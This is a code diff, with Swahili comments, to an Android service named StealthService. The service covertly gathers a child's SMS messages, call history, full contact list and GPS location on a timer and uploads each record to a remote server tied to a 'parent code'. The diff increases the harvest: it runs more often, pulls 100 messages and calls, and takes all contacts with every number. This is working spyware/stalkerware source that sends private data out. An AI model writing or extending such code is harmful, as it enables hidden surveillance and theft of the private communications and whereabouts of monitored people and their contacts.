@@ -69,153 +69,184 @@ public class StealthService extends Service {
             }
         }, 0);
 
-        // Schedule periodic data collection every 10 minutes (600000 ms)
+        // Schedule periodic data collection every 5 minutes (300000 ms)
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
                 collectAndSendAllData();
             }
-        }, 600000, 600000); // 10 minutes = 600000 ms
+        }, 300000, 300000); // 5 minutes = 300000 ms
 
-        Log.d(TAG, "📡 Surveillance imeanzishwa - data inatumwa kila baada ya dakika 10");
+        Log.d(TAG, "📡 Surveillance imeanzishwa - data inatumwa kila baada ya dakika 5");
     }
 
     private void collectAndSendAllData() {
         try {
-            Log.d(TAG, "🔄 Kuanza kukusanya data...");
+            Log.d(TAG, "🔄 Kuanza kukusanya DATA HALISI...");
 
-            // 1. Kusanya SMS za mtoto
+            // 1. Kusanya SMS ZOTE za mtoto
             if (checkPermission(Manifest.permission.READ_SMS)) {
-                collectAndSendSMSData();
+                collectAndSendAllSMS();
             }
 
-            // 2. Kusanya simu za mtoto
+            // 2. Kusanya SIMU ZOTE za mtoto
             if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
-                collectAndSendCallsData();
+                collectAndSendAllCalls();
             }
 
-            // 3. Kusanya anwani za mtoto
+            // 3. Kusanya ANWANI ZOTE za mtoto
             if (checkPermission(Manifest.permission.READ_CONTACTS)) {
-                collectAndSendContactsData();
+                collectAndSendAllContacts();
             }
 
-            // 4. Kusanya location ya mtoto
+            // 4. Kusanya LOCATION ya mtoto
             if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
-                collectAndSendLocationData();
+                collectAndSendLocation();
             }
 
-            // 5. Tuma device info
-            sendDeviceInfo();
-
-            Log.d(TAG, "✅ Ukusaji wa data umekamilika");
+            Log.d(TAG, "✅ Ukusaji wa DATA HALISI umekamilika");
 
         } catch (Exception e) {
             Log.e(TAG, "❌ Error collecting data: " + e.getMessage());
         }
     }
 
-    private void collectAndSendSMSData() {
+    // 🆕 KUKUSANYA SMS ZOTE
+    private void collectAndSendAllSMS() {
         try {
             Cursor cursor = getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
                 null, null, null,
-                Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT 10"
+                Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT 100" // SMS 100 za mwisho
             );
 
             if (cursor != null) {
                 int count = 0;
-                while (cursor.moveToNext() && count < 5) { // Tuma SMS 5 tu kwa kila cycle
-                    JSONObject smsData = new JSONObject();
-                    smsData.put("sender", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
-                    smsData.put("message", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
-                    smsData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
-                    smsData.put("type", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
+                while (cursor.moveToNext()) {
+                    try {
+                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                        String date = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                        String type = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
+                        
+                        // Badilisha timestamp kuwa format nzuri
+                        String readableDate = convertTimestampToDate(date);
+                        
+                        // Tuma SMS moja moja
+                        JSONObject smsData = new JSONObject();
+                        smsData.put("sender", address);
+                        smsData.put("message", body);
+                        smsData.put("timestamp", readableDate);
+                        smsData.put("type", getSMSTypeText(type));
 
-                    // Tuma SMS moja moja kwa server
-                    sendSingleDataToServer("sms", smsData);
-                    count++;
-                    
-                    // Pumzika kidogo kati ya SMS
-                    Thread.sleep(1000);
+                        sendSingleDataToServer("sms", smsData);
+                        count++;
+                        
+                        // Pumzika kidogo kuepusha overload
+                        Thread.sleep(500);
+                        
+                    } catch (Exception e) {
+                        Log.e(TAG, "❌ Error processing SMS: " + e.getMessage());
+                    }
                 }
                 cursor.close();
-                Log.d(TAG, "✅ SMS " + count + " zimetumwa");
+                Log.d(TAG, "✅ SMS " + count + " zimetumwa kikamilifu");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
         }
     }
 
-    private void collectAndSendCallsData() {
+    // 🆕 KUKUSANYA SIMU ZOTE
+    private void collectAndSendAllCalls() {
         try {
             Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
                 null, null, null,
-                CallLog.Calls.DATE + " DESC LIMIT 10"
+                CallLog.Calls.DATE + " DESC LIMIT 100" // Simu 100 za mwisho
             );
 
             if (cursor != null) {
                 int count = 0;
-                while (cursor.moveToNext() && count < 5) {
-                    JSONObject callData = new JSONObject();
-                    callData.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
-                    callData.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
-                    callData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
-                    callData.put("type", getCallTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
+                while (cursor.moveToNext()) {
+                    try {
+                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
+                        String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
+                        String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
+                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
+                        
+                        // Badilisha timestamp
+                        String readableDate = convertTimestampToDate(date);
+                        
+                        // Tuma simu moja moja
+                        JSONObject callData = new JSONObject();
+                        callData.put("number", number);
+                        callData.put("duration", duration + " sekunde");
+                        callData.put("timestamp", readableDate);
+                        callData.put("type", getCallTypeText(type));
 
-                    // Tuma simu moja moja
-                    sendSingleDataToServer("calls", callData);
-                    count++;
-                    
-                    Thread.sleep(1000);
+                        sendSingleDataToServer("calls", callData);
+                        count++;
+                        
+                        Thread.sleep(500);
+                        
+                    } catch (Exception e) {
+                        Log.e(TAG, "❌ Error processing call: " + e.getMessage());
+                    }
                 }
                 cursor.close();
-                Log.d(TAG, "✅ Simu " + count + " zimetumwa");
+                Log.d(TAG, "✅ Simu " + count + " zimetumwa kikamilifu");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading calls: " + e.getMessage());
         }
     }
 
-    private void collectAndSendContactsData() {
+    // 🆕 KUKUSANYA ANWANI ZOTE
+    private void collectAndSendAllContacts() {
         try {
             Cursor cursor = getContentResolver().query(
                 ContactsContract.Contacts.CONTENT_URI,
                 null, null, null,
-                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 20"
+                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
             );
 
             if (cursor != null) {
                 int count = 0;
-                while (cursor.moveToNext() && count < 10) {
-                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
-                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
-
-                    // Pata namba za simu za contact hii
-                    String phoneNumber = getContactPhoneNumber(contactId);
-                    
-                    if (phoneNumber != null) {
-                        JSONObject contactData = new JSONObject();
-                        contactData.put("name", name);
-                        contactData.put("phone", phoneNumber);
-                        contactData.put("timestamp", System.currentTimeMillis());
-
-                        // Tuma contact moja moja
-                        sendSingleDataToServer("contacts", contactData);
-                        count++;
+                while (cursor.moveToNext()) {
+                    try {
+                        String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
+                        String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                         
-                        Thread.sleep(1000);
+                        // Pata namba zote za simu za contact hii
+                        JSONArray phoneNumbers = getContactAllPhoneNumbers(contactId);
+                        
+                        if (phoneNumbers.length() > 0) {
+                            JSONObject contactData = new JSONObject();
+                            contactData.put("name", name);
+                            contactData.put("phones", phoneNumbers);
+                            contactData.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
+
+                            sendSingleDataToServer("contacts", contactData);
+                            count++;
+                            
+                            Thread.sleep(500);
+                        }
+                        
+                    } catch (Exception e) {
+                        Log.e(TAG, "❌ Error processing contact: " + e.getMessage());
                     }
                 }
                 cursor.close();
-                Log.d(TAG, "✅ Anwani " + count + " zimetumwa");
+                Log.d(TAG, "✅ Anwani " + count + " zimetumwa kikamilifu");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
         }
     }
 
-    private void collectAndSendLocationData() {
+    // 🆕 KUKUSANYA LOCATION
+    private void collectAndSendLocation() {
         try {
             locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
             if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
@@ -224,13 +255,14 @@ public class StealthService extends Service {
                     JSONObject locationData = new JSONObject();
                     locationData.put("latitude", lastLocation.getLatitude());
                     locationData.put("longitude", lastLocation.getLongitude());
-                    locationData.put("accuracy", lastLocation.getAccuracy());
-                    locationData.put("timestamp", lastLocation.getTime());
-                    locationData.put("address", "GPS Location");
+                    locationData.put("accuracy", lastLocation.getAccuracy() + " metres");
+                    locationData.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
+                    locationData.put("provider", "GPS");
 
-                    // Tuma location
                     sendSingleDataToServer("location", locationData);
-                    Log.d(TAG, "✅ Location imetumwa");
+                    Log.d(TAG, "✅ Location imetumwa kikamilifu");
+                } else {
+                    Log.d(TAG, "⚠️ Hakuna location data inapatikana");
                 }
             }
         } catch (Exception e) {
@@ -238,23 +270,9 @@ public class StealthService extends Service {
         }
     }
 
-    private void sendDeviceInfo() {
-        try {
-            JSONObject deviceInfo = new JSONObject();
-            deviceInfo.put("model", android.os.Build.MODEL);
-            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
-            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
-            deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
-            deviceInfo.put("collection_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
-
-            sendSingleDataToServer("device_info", deviceInfo);
-            Log.d(TAG, "✅ Device info imetumwa");
-        } catch (Exception e) {
-            Log.e(TAG, "❌ Error sending device info: " + e.getMessage());
-        }
-    }
-
-    private String getContactPhoneNumber(String contactId) {
+    // 🆕 NJIA ZA USAIDIZI
+    private JSONArray getContactAllPhoneNumbers(String contactId) {
+        JSONArray phones = new JSONArray();
         try {
             Cursor phoneCursor = getContentResolver().query(
                 ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -264,35 +282,52 @@ public class StealthService extends Service {
                 null
             );
 
-            if (phoneCursor != null && phoneCursor.moveToFirst()) {
-                String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
-                    ContactsContract.CommonDataKinds.Phone.NUMBER));
-                phoneCursor.close();
-                return phone;
-            }
             if (phoneCursor != null) {
+                while (phoneCursor.moveToNext()) {
+                    String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    phones.put(phone);
+                }
                 phoneCursor.close();
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error getting phone number: " + e.getMessage());
+            Log.e(TAG, "Error getting phone numbers: " + e.getMessage());
         }
-        return null;
+        return phones;
+    }
+
+    private String convertTimestampToDate(String timestamp) {
+        try {
+            long time = Long.parseLong(timestamp);
+            Date date = new Date(time);
+            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(date);
+        } catch (Exception e) {
+            return timestamp;
+        }
+    }
+
+    private String getSMSTypeText(String type) {
+        switch (type) {
+            case "1": return "Incoming";
+            case "2": return "Outgoing";
+            default: return "Unknown";
+        }
     }
 
     private String getCallTypeText(int callType) {
         switch (callType) {
             case CallLog.Calls.INCOMING_TYPE:
-                return "incoming";
+                return "Incoming";
             case CallLog.Calls.OUTGOING_TYPE:
-                return "outgoing";
+                return "Outgoing";
             case CallLog.Calls.MISSED_TYPE:
-                return "missed";
+                return "Missed";
             default:
-                return "unknown";
+                return "Unknown";
         }
     }
 
-    // 🆕 NJIA MPYA YA KUTUMA DATA MOJA MOJA KWA SERVER
+    // 🆕 NJIA YA KUTUMA DATA MOJA MOJA
     private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
         new Thread(() -> {
             try {
@@ -302,7 +337,7 @@ public class StealthService extends Service {
                 postData.put("parent_code", parentCode);
                 postData.put("data_type", dataType);
                 postData.put("device_id", android.os.Build.MODEL);
-                postData.put("data_content", dataContent); // ✅ DATA RAHISI MOJA KWA MOJA
+                postData.put("data_content", dataContent);
 
                 URL url = new URL(serverUrl);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
